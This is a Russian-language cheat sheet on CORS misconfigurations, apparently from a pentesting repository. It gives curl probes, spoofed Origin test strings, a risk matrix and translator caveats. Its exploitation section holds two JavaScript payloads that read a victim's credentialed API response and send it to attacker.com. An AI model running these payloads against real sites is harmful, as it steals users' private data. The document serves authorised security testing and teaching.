<a id="-cors-misconfiguration-cheatsheet"></a>
# 🌍 Справочник по ошибкам настройки CORS

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Cross-Origin Resource Sharing
```

---

<a id="-what-is-cors"></a>
## 🎯 Что такое CORS

**CORS** (Cross-Origin Resource Sharing, совместное использование ресурсов между разными источниками) определяет, каким источникам (origins) браузер разрешает доступ к ресурсам; источник — сочетание схемы, хоста и порта. Ошибки настройки могут позволить злоумышленнику читать конфиденциальные данные с другого источника.

> **Уточнение к оригиналу.** По [Fetch Standard](https://fetch.spec.whatwg.org/#cors-protocol-and-credentials), CORS регулирует чтение ответа скриптом в браузере и не заменяет серверную авторизацию. Отражение Origin и ACAC: true сами по себе не доказывают кражу данных: нужны контролируемый источник и доступный ему конфиденциальный ответ. [Правила cookies, включая SameSite, и политики сторонних cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS) также могут ограничивать передачу учётных данных, даже при credentials: include. Не все строки Origin из примеров соответствуют тому, что браузер отправит при реальном запросе.

---

<a id="-testing-cors"></a>
## 🔍 Проверка CORS

<a id="basic-test"></a>
### Базовая проверка
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Проверьте заголовки ответа:
Access-Control-Allow-Origin: https://evil.com  # Уязвимо! (оценка оригинала; см. уточнение)
Access-Control-Allow-Credentials: true         # Особенно опасно! (оценка оригинала; см. уточнение)
```

<a id="test-payloads-origin-header"></a>
### Строки для проверки (заголовок Origin)
```
# Обход проверки точного совпадения
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# Источник null
null

# Поддомен
https://sub.target.com

# Переход на менее защищённый протокол
http://target.com
```

---

<a id="-exploitation"></a>
## 💉 Эксплуатация

<a id="steal-data-with-credentials"></a>
### Кража данных с учётными данными
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Передать данные злоумышленнику
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

<a id="fetch-api-version"></a>
### Вариант с Fetch API
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

<a id="-vulnerability-matrix"></a>
## 📊 Матрица уязвимостей

> **Уточнение к таблице.** ACAO — Access-Control-Allow-Origin, ACAC — Access-Control-Allow-Credentials. Оценки риска перенесены из оригинала и зависят от содержимого ответа и контекста. Сочетание ACAO: * и ACAC: true не разрешает браузеру читать ответ при режиме credentials: include; без учётных данных wildcard может быть допустим. Отсутствие учётных данных само по себе не делает раскрытие данных малозначимым. Источник null требует отдельной оценки. В примерах [curl -I выполняет HEAD](https://curl.se/docs/manpage.html#-I): такие заголовки ещё не подтверждают чтение тела GET-ответа в браузере.

| Заголовок ACAO | ACAC | Риск |
|-------------|------|------|
| `*` | false | Низкий (без учётных данных) |
| `*` | true | Некорректная конфигурация (формулировка оригинала) |
| Источник злоумышленника | true | **КРИТИЧЕСКИЙ** |
| null | true | **ВЫСОКИЙ** |
| Отражённый источник | true | **КРИТИЧЕСКИЙ** |

<a id="dangerous-patterns"></a>
### Опасные шаблоны
```http
# Отражает любой источник
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Разрешает null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

<a id="-quick-checks"></a>
## 🛠️ Быстрые проверки

```bash
# Автоматизация с curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [CORS: PortSwigger](https://portswigger.net/web-security/cors)
- [Справочник по эксплуатации CORS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 Находите ошибки настройки CORS!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
